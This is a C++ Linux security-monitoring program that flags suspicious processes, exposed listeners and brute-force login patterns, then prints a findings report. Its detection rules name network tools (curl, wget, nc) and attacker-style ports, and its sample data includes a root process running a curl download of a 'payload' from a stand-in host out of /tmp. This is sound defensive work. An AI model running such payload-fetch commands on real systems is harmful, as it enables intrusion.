#include <algorithm>
#include <cstdint>
#include <iomanip>
#include <iostream>
#include <map>
#include <optional>
#include <set>
#include <sstream>
#include <stdexcept>
#include <string>
#include <tuple>
#include <vector>

enum class Severity : int {
    Info = 0,
    Low = 1,
    Medium = 2,
    High = 3,
    Critical = 4
};

std::string toString(Severity severity) {
    switch (severity) {
        case Severity::Info: return "INFO";
        case Severity::Low: return "LOW";
        case Severity::Medium: return "MEDIUM";
        case Severity::High: return "HIGH";
        case Severity::Critical: return "CRITICAL";
    }
    return "UNKNOWN";
}

struct ProcessRecord {
    int pid;
    int parentPid;
    unsigned int uid;
    std::string name;
    std::string executable;
    std::string command;
    std::uint64_t effectiveCapabilities;
};

struct Connection {
    std::string protocol;
    std::string state;
    std::string localAddress;
    unsigned int localPort;
    std::optional<int> owningPid;
    std::string owningProcess;
};

struct AuthenticationEvent {
    std::string timestamp;
    std::string username;
    std::string sourceAddress;
    bool successful;
};

struct Finding {
    Severity severity;
    std::string category;
    std::string title;
    std::string evidence;
    std::string action;
};

class SecurityMonitor {
private:
    std::vector<Finding> findings;
    std::set<int> knownPids;

    void add(Severity severity, const std::string& category,
             const std::string& title, const std::string& evidence,
             const std::string& action) {
        findings.push_back({severity, category, title, evidence, action});
    }

public:
    void analyzeProcesses(const std::vector<ProcessRecord>& processes) {
        knownPids.clear();
        for (const auto& process : processes) {
            if (process.pid <= 0 || process.parentPid < 0) {
                throw std::invalid_argument("Invalid PID or parent PID");
            }
            if (!knownPids.insert(process.pid).second) {
                throw std::invalid_argument("Duplicate PID in process snapshot");
            }
        }

        for (const auto& process : processes) {
            if (process.uid == 0 &&
                (process.command.find("curl ") != std::string::npos ||
                 process.command.find("wget ") != std::string::npos ||
                 process.command.find("nc ") != std::string::npos)) {
                add(
                    Severity::Medium, "process",
                    "Privileged process uses a network utility",
                    "pid=" + std::to_string(process.pid) + " command=" + process.command,
                    "Verify executable provenance, parent process, destination, and purpose."
                );
            }

            if (process.executable.rfind("/tmp/", 0) == 0 ||
                process.executable.rfind("/dev/shm/", 0) == 0) {
                add(
                    Severity::High, "process",
                    "Executable resides in a temporary directory",
                    "pid=" + std::to_string(process.pid) + " path=" + process.executable,
                    "Inspect the file hash, permissions, package provenance, and execution ancestry."
                );
            }

            if (process.effectiveCapabilities != 0) {
                std::ostringstream capabilityText;
                capabilityText << "pid=" << process.pid << " capabilities=0x"
                               << std::hex << process.effectiveCapabilities;
                add(
                    Severity::Low, "process",
                    "Process has effective Linux capabilities",
                    capabilityText.str(),
                    "Compare effective capabilities with the service's least-privilege policy."
                );
            }

            if (process.parentPid == 1 &&
                process.name != "systemd" &&
                process.name != "sshd" &&
                process.name != "cron" &&
                process.name != "dockerd") {
                add(
                    Severity::Low, "process",
                    "Process is parented by PID 1",
                    "pid=" + std::to_string(process.pid) + " name=" + process.name,
                    "Inspect ancestry and service records; reparenting alone is not evidence of compromise."
                );
            }
        }
    }

    void analyzeConnections(const std::vector<Connection>& connections) {
        for (const auto& connection : connections) {
            if (connection.localPort > 65535) {
                throw std::invalid_argument("Network port exceeds 65535");
            }
            if (connection.state != "LISTEN") continue;

            Severity severity = Severity::Info;
            std::string title = "Review listener ownership and exposure";

            if (connection.localPort == 2375) {
                severity = Severity::High;
                title = "Docker API listener requires immediate exposure review";
            } else if (connection.localPort == 5432 ||
                       connection.localPort == 3306 ||
                       connection.localPort == 6379 ||
                       connection.localPort == 27017) {
                severity = Severity::Medium;
                title = "Database or cache listener requires network review";
            } else if (connection.localPort == 4444 ||
                       connection.localPort == 5555 ||
                       connection.localPort == 31337) {
                severity = Severity::Medium;
                title = "Unusual listening port requires process attribution";
            } else if (connection.localPort == 22) {
                severity = Severity::Low;
                title = "SSH listener requires access-policy validation";
            }

            const bool wildcard =
                connection.localAddress == "0.0.0.0" ||
                connection.localAddress == "::" ||
                connection.localAddress == "*";

            if (wildcard && static_cast<int>(severity) <
                                static_cast<int>(Severity::Medium)) {
                severity = Severity::Medium;
                title = "Wildcard-bound listener requires exposure review";
            }

            std::ostringstream evidence;
            evidence << connection.protocol << " " << connection.localAddress
                     << ":" << connection.localPort
                     << " process=" << connection.owningProcess
                     << " pid=";
            if (connection.owningPid) {
                evidence << *connection.owningPid;
            } else {
                evidence << "unknown";
            }

            add(
                severity, "network", title, evidence.str(),
                "Confirm process ownership, firewall rules, service authentication, and intended exposure."
            );
        }
    }

    void analyzeAuthentication(
        const std::vector<AuthenticationEvent>& events,
        std::size_t threshold = 5
    ) {
        if (threshold == 0) {
            throw std::invalid_argument("Authentication threshold must be positive");
        }

        std::map<std::string, std::size_t> sourceFailures;
        std::map<std::string, std::size_t> accountFailures;
        std::map<std::string, std::size_t> precedingFailures;

        // This model assumes events are already ordered within one observation
        // window. Production ingestion must sort or watermark late-arriving events.
        for (const auto& event : events) {
            if (!event.successful) {
                ++sourceFailures[event.sourceAddress];
                ++accountFailures[event.username];
                ++precedingFailures[event.sourceAddress];
            } else {
                const auto count = precedingFailures[event.sourceAddress];
                if (count >= threshold) {
                    add(
                        Severity::High, "authentication",
                        "Successful login follows repeated failures",
                        "user=" + event.username + " source=" + event.sourceAddress +
                            " preceding_failures=" + std::to_string(count),
                        "Verify the session, MFA outcome, account owner, and endpoint activity."
                    );
                }
            }
        }

        for (const auto& [source, count] : sourceFailures) {
            if (count >= threshold) {
                add(
                    count >= threshold * 2 ? Severity::High : Severity::Medium,
                    "authentication",
                    "Repeated authentication failures from one source",
                    "source=" + source + " failures=" + std::to_string(count),
                    "Correlate with identity and network logs before applying a block."
                );
            }
        }

        for (const auto& [username, count] : accountFailures) {
            if (count >= threshold) {
                add(
                    Severity::Medium, "authentication",
                    "Repeated authentication failures against an account",
                    "user=" + username + " failures=" + std::to_string(count),
                    "Distinguish password spraying, stale credentials, and legitimate mistakes."
                );
            }
        }
    }

    void printReport() {
        std::stable_sort(findings.begin(), findings.end(),
            [](const Finding& left, const Finding& right) {
                return static_cast<int>(left.severity) >
                       static_cast<int>(right.severity);
            });

        std::map<std::string, std::size_t> categoryCounts;
        for (const auto& finding : findings) {
            ++categoryCounts[finding.category];
        }

        std::cout << "Linux Security Monitoring Report\n";
        std::cout << "Findings: " << findings.size() << "\n\n";

        for (const auto& finding : findings) {
            std::cout << "[" << toString(finding.severity) << "] "
                      << finding.category << ": " << finding.title << "\n"
                      << "  Evidence: " << finding.evidence << "\n"
                      << "  Action: " << finding.action << "\n\n";
        }

        std::cout << "Category totals\n";
        for (const auto& [category, count] : categoryCounts) {
            std::cout << "  " << category << ": " << count << "\n";
        }
    }
};

int main() {
    try {
        SecurityMonitor monitor;

        // A coherent endpoint case: one suspicious executable, a risky listener,
        // and authentication events requiring correlation.
        const std::vector<ProcessRecord> processes = {
            {401, 1, 0, "curl", "/tmp/curl",
             "curl https://example.invalid/payload", 0},
            {512, 1, 0, "sshd", "/usr/sbin/sshd",
             "/usr/sbin/sshd -D", 0},
            {620, 900, 1000, "worker", "/usr/bin/python3",
             "python3 worker.py", 0},
            {720, 1, 0, "dockerd", "/usr/bin/dockerd",
             "/usr/bin/dockerd", 1ULL << 21}
        };

        const std::vector<Connection> connections = {
            {"tcp", "LISTEN", "0.0.0.0", 2375, 720, "dockerd"},
            {"tcp", "LISTEN", "127.0.0.1", 5432, 730, "postgres"},
            {"tcp", "LISTEN", "0.0.0.0", 22, 512, "sshd"},
            {"tcp", "ESTABLISHED", "192.0.2.10", 443, 620, "worker"}
        };

        const std::vector<AuthenticationEvent> authEvents = {
            {"2026-10-10T06:00:00Z", "admin", "203.0.113.44", false},
            {"2026-10-10T06:00:01Z", "admin", "203.0.113.44", false},
            {"2026-10-10T06:00:02Z", "admin", "203.0.113.44", false},
            {"2026-10-10T06:00:03Z", "admin", "203.0.113.44", false},
            {"2026-10-10T06:00:04Z", "admin", "203.0.113.44", false},
            {"2026-10-10T06:00:05Z", "admin", "203.0.113.44", true}
        };

        monitor.analyzeProcesses(processes);
        monitor.analyzeConnections(connections);
        monitor.analyzeAuthentication(authEvents);
        monitor.printReport();
    } catch (const std::exception& exception) {
        std::cerr << "Monitoring error: " << exception.what() << "\n";
        return 1;
    }

    return 0;
}
